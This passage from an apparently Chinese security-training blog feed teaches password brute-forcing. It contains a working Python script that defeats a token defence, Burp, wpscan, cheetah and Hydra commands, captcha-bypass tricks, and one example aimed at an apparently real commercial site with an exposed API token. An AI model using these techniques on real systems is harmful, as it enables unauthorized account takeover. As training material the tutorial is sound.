年</h4><p>2019 年，豹科技受江苏警方委托，协助技术办案。过程中他们掌握了目标后台可以进行金融转账的漏洞。吴私下利用了这个漏洞进行了金融盗窃，通过各种隐蔽的提现操作，转账共计 88.47755 万元。作案两个月之后，吴永丰主动投案，随后被法院判处有期徒刑十二年。</p><h4 id="网络安全培训黑麒麟判刑一年俩月其徒弟被判二到三年"><a class="markdownIt-Anchor" href="#网络安全培训黑麒麟判刑一年俩月其徒弟被判二到三年">#</a> 网络安全培训–黑麒麟判刑一年俩月，其徒弟被判二到三年</h4><p>培训期间实战日站，也因多次利用黑客技术入侵政府、商业网站，窃取出售个人信息受到处罚，其徒弟因为获取非法数据过多被判三年和三年以上。</p><ul><li>持续更新中…</li></ul><h2 id="六行业内公众号汇总"><a class="markdownIt-Anchor" href="#六行业内公众号汇总">#</a> 六：行业内公众号汇总</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/DropsOfZut/awesome-security-weixin-official-accounts</span><br></pre></td></tr></table></figure><iframe style="width: 1px; height: 1px; position: absolute; left: -100px; bottom: -100px; display: none;" src="https://tracert.alipay.com/cross.html"></iframe>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第一天渗透测试简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#第一天渗透测试简介&quot;&gt;#&lt;/a&gt; 第一天：渗透测试简介&lt;/h1&gt;
&lt;h2 id=&quot;一术语介绍&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#一</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://sun-spots.github.io/2022/03/02/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%BA%8C%E5%91%A8/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"/>
    <id>https://sun-spots.github.io/2022/03/02/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%BA%8C%E5%91%A8/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/</id>
    <published>2022-03-02T02:53:37.218Z</published>
    <updated>2022-03-02T03:01:51.631Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第一天穷举"><a class="markdownIt-Anchor" href="#第一天穷举">#</a> 第一天：穷举</h1><h1 id="概述"><a class="markdownIt-Anchor" href="#概述">#</a> 概述</h1><p>穷举就是枚举的意思，在互联网的今天，需要使用某种的服务，大多数都需要口令登录，这个口令就是密码，密码的强度分为，弱口令 、中度口令、强度口令。 如果登录的服务为弱口令，那会存在很大的安全隐患，黑客通过穷举弱口令对服务进行攻击，很容易就得到登录密码。得到密码之后就能登录服务，进行其他危害较大得操作。黑客也能通过对用户得信息整理，组合密码进行穷举攻击。例如：根据用户的生日号码，出身年月日和姓名进行口令组合，再对其服务进行穷举；</p><p>综合工具：密码字典，爆破工具：</p><p>链接：<span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMUhWaElNU0RYWXJoNmpzWEdSRzdoX0E=">https://pan.baidu.com/s/1HVhIMSDXYrh6jsXGRG7h_A</span> 提取码：li5k</p><h1 id="常见的服务"><a class="markdownIt-Anchor" href="#常见的服务">#</a> 常见的服务</h1><p>FTP 端口号 20 和 21 的主要区别在于，20 端口号是用于传输数据（包括接收和传送文件），21 端口号则是用于传输控制信息（接收和传送 FTP 指令）。</p><p>详见：<span class="exturl" data-url="aHR0cHM6Ly93d3cuaWRjc3B5LmNvbS8zNTg5Ni5odG1s">https://www.idcspy.com/35896.html</span></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628076688797-4e47a581-28ef-45f3-a342-e23e13ec601f.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628076700758-0e5a4203-73a5-4f44-a1da-6282a8312d7d.png" alt="img"></p><h1 id="burp穷举后台密码"><a class="markdownIt-Anchor" href="#burp穷举后台密码">#</a> Burp 穷举后台密码</h1><p>截取包之后发送到 intruder 给密码设置变量；</p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2RvY3Mvc2hhcmUvMjQyNTUwMzktNDk2Mi00YTlhLWI3NTgtMzIzYzRmNTExMTM4PyMlRUYlQkMlODglRTUlQUYlODYlRTclQTAlODElRUYlQkMlOUF6eTFkJUVGJUJDJTg5">https://www.yuque.com/docs/share/24255039-4962-4a9a-b758-323c4f511138?#（密码：zy1d）</span> 《基于表单的暴力破解》</p><p>测试网站：<span class="exturl" data-url="aHR0cDovL3d3dy5oYXBweXRveXMuY29tLnR3L2hhcHB5dG95c21rMi91c2VyLnBocA==">http://www.happytoys.com.tw/happytoysmk2/user.php</span></p><p>账号：test</p><p>密码：123456</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628078234896-6f804bb0-c18d-41f4-a806-3ea4f1708efc.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628078484342-941e0078-8d59-4962-9ef7-de21ac59249f.png" alt="img"></p><p>设置攻击后，根据返回的状态码 status 或者 length 网页长度对其进行判断，这里得到正确得密码是 123456</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628078560436-6fdb294a-9771-43b7-987d-899d8b312631.png" alt="img"></p><h1 id="burp对webshell穷举"><a class="markdownIt-Anchor" href="#burp对webshell穷举">#</a> Burp 对 webshell 穷举</h1><p>灰帽子对网站攻破后，一般会留后门方便对其网站进行非法管理。后门的程序语言包括 asp php .net 这些脚本文件放在网站目录， 一般都采用单密码进行登录，通过扫描获取 webshell 的后门的网址，得到网址后可以对其进行密码穷举；</p><p>截取包之后发送到 intruder 给密码设置变量；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628079049316-3b2def9e-744b-4d57-a6d8-92c2f2b89ada.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628079133670-2424957b-0419-40d4-a6fb-dbf2c466260c.png" alt="img"></p><h1 id="有-token-防御的网站后台穷举破"><a class="markdownIt-Anchor" href="#有-token-防御的网站后台穷举破">#</a> 有 token 防御的网站后台穷举破</h1><p><span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2RvY3Mvc2hhcmUvNjdjMTBkNjctZDg3MS00NTM1LThhYzgtYzQ1ZDU5OGI4ZWIzPyMlRUYlQkMlODglRTUlQUYlODYlRTclQTAlODElRUYlQkMlOUFneXFhJUVGJUJDJTg5">https://www.yuque.com/docs/share/67c10d67-d871-4535-8ac8-c45d598b8eb3?#（密码：gyqa）</span> 《Token 防爆破》</p><p>有的网站后台存在 token 值，这个 token 通俗的名字叫令牌，每次刷新页面都会随机变化，提交请求时必须携带这个 token 值，可以利用这点避免后台进行直接穷举和防止 csrf 攻击；</p><p>我们每次刷新，都可以看到这个 token 的值会改变；</p><p>但如果直接爆破的话会是用的第一次的 token 的值，如果第二次密码进行匹配的时候，他还是第一次的 token 的值的话，服务端那边的 token 的值就是不匹配的，所以就会提示 csrf 攻击；</p><p>所以我们每次进行爆破的时候也许要让他跟随改变；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628079340667-4811eb6a-0e54-48f6-b177-5951b5a1cad4.png" alt="img"></p><h2 id="burp设置宏获取-token-对网站后台密码破解"><a class="markdownIt-Anchor" href="#burp设置宏获取-token-对网站后台密码破解">#</a> Burp 设置宏获取 token 对网站后台密码破解</h2><p>打开 burpsuite 刷新页面，接着 forward 放行这个数据；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628079451206-3d804314-3acc-4e52-ac7f-2937a1fe379a.png" alt="img"></p><p>来到 Project options --&gt; Session-- &gt;add 添加回话处理规则</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628079591158-1fdbd888-c52c-43e0-b5b1-eca8b3b5e4d4.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628079614917-871b9a5c-9c07-4c9e-aa8a-e703675e1f1e.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628079646159-85fcf3b9-cac1-42cf-896b-9b491008877f.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628079681778-cc70cb9f-2d38-48a0-8eb4-8df4f53fa067.png" alt="img"></p><p>网页历史选择提交之后有 token 的页面；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628079707770-6f965015-25dd-4004-947b-74afd313e1d6.png" alt="img"></p><p>设置  项目设置（ configure item ）</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628079810511-40fc8db7-faf8-4903-8772-fbfa17bcf032.png" alt="img"></p><p>选择 value 的值 Parameter name 填写 user_token 这个值一定要相同；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628079992637-14f34776-a3ef-42bc-8623-02287b2d5898.png" alt="img"></p><p>一路 OK，到下面这个页面，设置仅更新此参数；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628080193319-295402a7-a035-446f-affe-e00ac7c50b2b.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628080168352-404b2e4d-8dd6-40c0-8094-83662371ada1.png" alt="img"></p><p>设置范围，当然，不设置也是没问题的；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628081098325-d1acc6cc-8ba8-4cbf-b1cb-94f8f44483d2.png" alt="img"></p><p>抓登陆包，截取包之后发送到 intruder 给密码设置变量；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628081291931-3ac9ce73-e521-46b5-ac25-2c3111104f3d.png" alt="img"></p><p>这是时候注意，因为 DVWA 是登陆后进行跳转的，所以我们爆破出来的页面都是 302 跳转的状态码，我们要设置一下跟随跳转；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628081355070-269f58a0-98a9-41ac-93f4-c502582d0ac2.png" alt="img"></p><p>因存在问题，持续更新。。。</p><h2 id="编写脚本获取-token-对网站后台密码破解"><a class="markdownIt-Anchor" href="#编写脚本获取-token-对网站后台密码破解">#</a> 编写脚本获取 token 对网站后台密码破解</h2><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628130166655-67f2b38a-d3b5-4ec2-b1fc-999a7eb8d597.png" alt="img"></p><p>每次访问页面这个 user_token 都会变化导致不能重复提交，验证原理每次页面生成 user_token 存在 seesion 里面每次登录用 session 里取出来 然后验证如果验证成功，就进行密码匹配。如果验证不成功就输出 csrf 错误；</p><p>脚本源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url = &quot;http://192.168.0.56/DVWA/login.php&quot;</span><br><span class="line"></span><br><span class="line">def login(password):</span><br><span class="line">    session = requests.session()</span><br><span class="line">    req=session.get(url)</span><br><span class="line">    user_token=re.search(&quot;[a-z0-9]&#123;32&#125;&quot;,req.text).group(0) #32md5</span><br><span class="line">    data=&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:password,&quot;Login&quot;:&quot;Login&quot;,&#x27;user_token&#x27;:user_token&#125;</span><br><span class="line">    req=session.post(url=url,data=data,allow_redirects=True)</span><br><span class="line">    html = req.text</span><br><span class="line">    return html</span><br><span class="line"></span><br><span class="line">with open(&#x27;top1000.txt&#x27;) as p:</span><br><span class="line">    passlist =p.readlines()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line">for line in passlist:</span><br><span class="line">    line = line.strip(&quot;\n&quot;)</span><br><span class="line">    print(line)</span><br><span class="line">    if &#x27;File Upload&#x27; in login(line):</span><br><span class="line">        print( &quot;[* 密码 is %s *]&quot; % line )</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628130458034-eb217c4e-bcd0-4e75-a711-28fa0aa221a0.png" alt="img"></p><h1 id="针对有验证码后台的穷举方法"><a class="markdownIt-Anchor" href="#针对有验证码后台的穷举方法">#</a> 针对有验证码后台的穷举方法</h1><p>网站后台或者有登录的地方都可能存在验证码验证，验证码的作用给网站为了防止用户利用机器人自动注册、登录、灌水，都会采用验证码技术，所谓的验证码，就是将一串随机产生的数字和符号，生成一幅图片，在图像上加上干扰像素（防止 orc），要用户用肉眼识别其中的验证码信息，输入表单提交网站验证，验证后使用网站某个功能，但是如果验证码逻辑编写不好会存在被绕过的风险；</p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2RvY3Mvc2hhcmUvMDBjZjJlZWMtZTBlZS00MGJkLTljNDEtZGQzZmFlMTM5NTUwPyMlRUYlQkMlODglRTUlQUYlODYlRTclQTAlODElRUYlQkMlOUF3Z2E1JUVGJUJDJTg5">https://www.yuque.com/docs/share/00cf2eec-e0ee-40bd-9c41-dd3fae139550?#（密码：wga5）</span> 《验证码绕过 (on client)》</p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2RvY3Mvc2hhcmUvODBjNGRiYWYtOWI2Zi00YTEwLTkxZDktNDFhMTMxYmVhODg2PyMlRUYlQkMlODglRTUlQUYlODYlRTclQTAlODElRUYlQkMlOUF5bnQ5JUVGJUJDJTg5">https://www.yuque.com/docs/share/80c4dbaf-9b6f-4a10-91d9-41a131bea886?#（密码：ynt9）</span> 《验证码绕过 (on server)》</p><h2 id="cookie-不存在不验证绕过"><a class="markdownIt-Anchor" href="#cookie-不存在不验证绕过">#</a> cookie 不存在不验证绕过</h2><p>环境：CmsEasy 7_7_3_20210505</p><p>有些网站如果网站不存在 cookie 就不会验证验证码 ；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628156321735-2fd8e60d-cd16-45d8-876f-0a7b95ffda6e.png" alt="img"></p><p>删除 PHPSESSION 信息，验证码就不进行验证了；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628156360161-37537749-2c41-4fc4-bf49-8c791e1bf086.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628156372788-bf7f6250-9dc0-49de-a26f-ab33801bcbea.png" alt="img"></p><p>穷举密码</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628156485801-9a6c95a9-c996-4ee1-ae82-dd35ee5165b8.png" alt="img"></p><h2 id="后台登录验证码没销毁进行穷举"><a class="markdownIt-Anchor" href="#后台登录验证码没销毁进行穷举">#</a> 后台登录验证码没销毁进行穷举</h2><p>在登录提交的时候进行验证码验证，不管密码是否正确，都要销毁验证码；</p><p>不然验证码就可能会存在复用情况；</p><p>环境：emlog5.3.1</p><p>输入账号密码，提交抓包，首先第一次提示的是密码错误，不修改再提交一次同样是密码错误；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628332485026-0e44f905-0726-4e12-b7aa-b5a1a296adff.png" alt="img"></p><p>修改错误的验证码，可以发现，变成了验证错误；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628332547436-d54ba1bb-7b5d-417f-85e8-0050a082c9ed.png" alt="img"></p><p>转到 intruder 模块进行爆破，注意，是正确的验证码，不是修改后的验证码；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628332941941-b8bf9284-97bb-4340-93c1-3aeb3107a6d9.png" alt="img"></p><p>登陆成功，都会有 302 跳转的；</p><h2 id="网站后台验证码识别穷举密码"><a class="markdownIt-Anchor" href="#网站后台验证码识别穷举密码">#</a> 网站后台验证码识别穷举密码</h2><p>验证码干扰像素太少很容易就会被一些工具识别出来。如图片提取文字工具；</p><p>环境：emlog5.3.1</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628333623332-ea5f12bc-c59c-4a83-92d4-8fa58924cd4d.png" alt="img"></p><p>右键查看图片地址就可以看到图片文件的路径；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628333667374-d675e240-d195-40cf-90cb-acfbe7f3f6b5.png" alt="img"></p><p>这里我们可以用到一个工具 codex 验证码后台登录爆破辅助工具 <span class="exturl" data-url="aHR0cHM6Ly93YXJzZWMueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMS96aXAvMjk0MjIyNi8xNjQwNzYxMTQ1NDcxLWQ4YjUwMjFlLTIyYTktNDkwZC1hYWUzLTE0M2EyMDY5NTc0NC56aXA=">📎Codex 验证码后台爆破 V2.1.zip</span>；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628333830143-c62aa3d6-c957-42d7-b0c6-2dbc103aae7f.png" alt="img"></p><p>使用 burp 抓取登录数据包，复制请求包到请求拦内；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628333892818-2437a5be-cfed-47ee-afff-fabb3009a199.png" alt="img"></p><p>标记验证码，并且标记密码，选择爆破密码，将验证码的地址复制上去，最后导入密码；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628334075074-fa20448a-5eaf-4f8e-99b5-961290258161.png" alt="img"></p><p>导入密码这有个坑点，你可能会看到下面这个样子；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628334152409-5236e9f6-f16e-4233-8174-a9729b65fc0d.png" alt="img"></p><p>这是因为每行一个默认是 unix 系统的适配字典，而不是 windos 的，所以会识别一个，使用 sublime text 工具打开字典，全选，视图–&gt; 行结束符–&gt;windows 换行符    改一下保存就可以了；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628334364508-7387e656-b5b3-41e5-a1a4-7fd19fc7e9bd.png" alt="img"></p><p>回到爆破栏， 选择错误的验证码关键词，错误的页面会返回的关键字，比如 &quot;验证错误&quot;，设置线程 点击 start 即可 可以选择 再次爆破 验证准确率会提高；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628334481997-50e5ba23-fa06-4016-b37e-434307e6f4e2.png" alt="img"></p><p>看长度，判断密码，看返回包，判断密码，可以看到密码就是 123456；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628334521704-720c9527-7840-4d1b-a3c6-e47e6c3e85eb.png" alt="img"></p><h1 id="phpmyadmin-密码穷举"><a class="markdownIt-Anchor" href="#phpmyadmin-密码穷举">#</a> phpmyadmin 密码穷举</h1><p>phpmyadmin 是 mysql 的一个 web 管理工具，可以通过这个工具穷举 mysql 用户的账号和密码 ；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628335349845-86faecc6-f73b-4ef5-a701-1a1f762f09a7.png" alt="img"></p><h1 id="一句话木马后门破解"><a class="markdownIt-Anchor" href="#一句话木马后门破解">#</a> 一句话木马后门破解</h1><p>一句话后门可以使用 burpsuite 通用穷举方法穷举密码；</p><p>抓到包后就可以右键转换请求方法；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628336175693-a6105167-3fc5-4914-af3b-6d12cd621ecf.png" alt="img"></p><p>数据包发送到 intruder 模块下，将 cmd 设置为变量，导入字典进行爆破；</p><p>这里准备了三个关键词，因为每个脚本语言的不同，执行命令也不同，不可能都使用 phpinfo () 函数来输出，我们可以让成功成功的密码返回指定的内容；</p><p>asp</p><p>execute(“response.clear:response.write(”“passwordright”&quot;):response.end&quot;)</p><p>php</p><p>echo “password rig”;</p><p>aspx</p><p>Response.Write(“ruchu666”);</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628336276240-51c39f82-f2e1-4669-985a-ab74cf1dbf83.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628336361947-ae9f3591-5a03-4643-afc2-aab1c75c5cdd.png" alt="img"></p><h1 id="cheetah-对一句后门密码穷举"><a class="markdownIt-Anchor" href="#cheetah-对一句后门密码穷举">#</a> cheetah 对一句后门密码穷举</h1><p>cheetah 是针对一句话后门的穷举工具；</p><p>只能在 kali 内运行；</p><h3 id="使用方法"><a class="markdownIt-Anchor" href="#使用方法">#</a> 使用方法：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">python cheetah.py -u http://orz/orz.php</span><br><span class="line">python cheetah.py -u http://orz/orz.jsp -r post -n 1000 -v</span><br><span class="line">python cheetah.py -u http://orz/orz.asp -r get -c -p data/pwd.list</span><br><span class="line">python cheetah.py -u http://orz/orz -w aspx -s iis -n 1000</span><br><span class="line">python cheetah.py -b url.list -c -p pwd1.list pwd2.list -v</span><br><span class="line">cheetah.py -u http://www.c1moon.com/a.php -n 1000 -v -p data/pwd.list</span><br><span class="line">cheetah.py -u http://www.c1moon.com/a.asp -n 1000 -v -p data/pwd.list</span><br><span class="line">cheetah.py -u http://www.c1moon.com/a.aspx -n 1000 -v -p data/pwd.lis</span><br><span class="line"></span><br><span class="line">支持 asp php .net jsp 后门</span><br><span class="line">-u 后门地址</span><br><span class="line">-r 提交的方法 一般是 post</span><br><span class="line">-n 一次提交密码的数量</span><br><span class="line">-v 详细信息</span><br><span class="line">-p 字典位置</span><br></pre></td></tr></table></figure><p>python3 <span class="exturl" data-url="aHR0cDovL2NoZWV0YWgucHk=">cheetah.py</span> -u <span class="exturl" data-url="aHR0cDovL3d3dy5jMW1vb24uY29tL2NtZC5waHA=">http://www.c1moon.com/cmd.php</span> -r post -n 1000</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628341590420-23613fe8-a311-4a93-b01b-580fdf84d8f7.png" alt="img"></p><h1 id="wordpress-博客系统用户密码穷举"><a class="markdownIt-Anchor" href="#wordpress-博客系统用户密码穷举">#</a> wordpress 博客系统用户密码穷举</h1><p>wordpress 是知名的博客系统，在互联网上的占有量很大，所以一定要知道这套 系统的弱口令穷举的方法；</p><p>爆破 wordpress 博客系统的话我们会用到 wpscan 这个工具，专门针对于 wordpress 博客系统进行安全评估的工具；</p><p>爆破之前我们需要先获取一个 token，因为 wordpress 有很多插件，需要使用 token 去加载插件，然后进行安全评估；</p><p><span class="exturl" data-url="aHR0cHM6Ly93cHNjYW4uY29t">https://wpscan.com</span> 首先到这个网站注册账号和密码注册后获取 token；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628350194726-5837006c-3681-47f2-8442-746a6c8c2411.png" alt="img"></p><p>kali 自带 wpscan，-e u 参数自动找账号信息，然后登录穷举；</p><p>wpscan --url <span class="exturl" data-url="aHR0cDovL3d3dy5yZWR0ZWFtLmNvbS8=">http://www.redteam.com/</span> -e u -P /home/kali/top100password.txt --api-token DTa0mUG4l04uquwu4WvAIJuFAESdT7hSoORsutqbf3c</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628351481457-29a4bcf8-234d-44a2-9cb6-5800143c03d7.png" alt="img"></p><p>如果上面这个工具爆破之后什么信息都没找到，那我们可以尝试手动查找信息爆破；</p><p>手动收集 wordpress 用户信息，访问连接获取用户：</p><ul><li><ul><li>/wp-json/wp/v2/users    获取信息可以再进行指定用户爆破；</li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628351772119-76d0a65e-d2e3-4793-81d6-0adfdecd9c23.png" alt="img"></p><p>获取到用户账户名后，在进行爆破；</p><p>wpscan --url <span class="exturl" data-url="aHR0cDovL3d3dy5yZWR0ZWFtLmNvbQ==">http://www.redteam.com</span> -U admin -P /home/kali/Desktop/top100password.txt</p><ul><li><ul><li>使用账号名爆破就不需要在加 token 了；</li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628351954812-b5dc07c2-91dc-41ab-8475-57478ba5de4c.png" alt="img"></p><h1 id="常见的端口服务穷举"><a class="markdownIt-Anchor" href="#常见的端口服务穷举">#</a> 常见的端口服务穷举</h1><h2 id="hydra-密码穷举工具的使用"><a class="markdownIt-Anchor" href="#hydra-密码穷举工具的使用">#</a> hydra 密码穷举工具的使用</h2><p>Hydra 是一个相当强大的暴力密码破解工具。该工具支持几乎所有协议的在线密码破解，如 FTP、HTTP、HTTPS、MySQL、MS SQL、Oracle、Cisco、IMAP 和 VNC 等。其密码能否被破解，关键在于字典是否足够强大。很多用户可能对 Hydra 比较熟悉，因为该工具有图形界面，且操作十分简单，基本上可以 “傻瓜” 操作；</p><p>美国队长中的大反派 hydra（九头蛇）组织</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1625908987962-4f1b6663-a433-403a-92c3-78cb45f7441f.png" alt="img"></p><p>hydra 是著名组织 thc 的一款开源的暴力破解密码工具，功能非常强大；</p><p>kali 下是默认安装的，几乎支持所有协议的在线破解；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628352229934-1c23bb9b-73c8-4933-a2cf-dce46100df99.png" alt="img"></p><p>密码能否破解，在于字典是否强大以及电脑的性能；</p><p>我们就介绍下，这个装备怎么用；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628352247698-2373a203-cb7a-43d6-97df-ca161d5688f9.png" alt="img"></p><p>** 语法：**<strong>Hydra 参数 IP 服务</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">常用参数说明</span><br><span class="line">hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns]</span><br><span class="line">[-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV]</span><br><span class="line">server service [OPT]</span><br><span class="line">-R</span><br><span class="line">继续从上一次进度接着破解</span><br><span class="line">-S</span><br><span class="line">大写，采用 SSL 链接</span><br><span class="line">-s &lt;PORT&gt;</span><br><span class="line">小写，可通过这个参数指定非默认端口</span><br><span class="line">-l &lt;LOGIN&gt;</span><br><span class="line">指定破解的用户，对特定用户破解</span><br><span class="line">-L &lt;FILE&gt;</span><br><span class="line">指定用户名字典</span><br><span class="line">-p &lt;PASS&gt;</span><br><span class="line">小写，指定密码破解，少用，一般是采用密码字典</span><br><span class="line">-P &lt;FILE&gt;</span><br><span class="line">大写，指定密码字典</span><br><span class="line">-e &lt;ns&gt;</span><br><span class="line">可选选项，n：空密码试探，s：使用指定用户和密码试探</span><br><span class="line">-C &lt;FILE&gt;</span><br><span class="line">使用冒号分割格式，例如“登录名:密码”来代替-L/-P 参数</span><br><span class="line">-M &lt;FILE&gt;</span><br><span class="line">指定目标列表文件一行一条</span><br><span class="line">-o &lt;FILE&gt;</span><br><span class="line">指定结果输出文件</span><br><span class="line">-f</span><br><span class="line">在使用-M 参数以后，找到第一对登录名或者密码的时候中止破解</span><br><span class="line">-t &lt;TASKS&gt;</span><br><span class="line">同时运行的线程数，默认为 16</span><br><span class="line">-w &lt;TIME&gt;</span><br><span class="line">设置最大超时的时间，单位秒，默认是 30s</span><br><span class="line">-v / -V</span><br><span class="line">显示详细过程</span><br><span class="line">server</span><br><span class="line">  目标 ip</span><br><span class="line">service</span><br><span class="line">指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt</span><br><span class="line">http[s]-&#123;head|get&#125; http-&#123;get|post&#125;-form http-proxy cisco cisco-enable vnc ldap2 ldap3</span><br><span class="line">mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn</span><br><span class="line">icq sapr3 ssh2 smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp</span><br><span class="line">等等</span><br><span 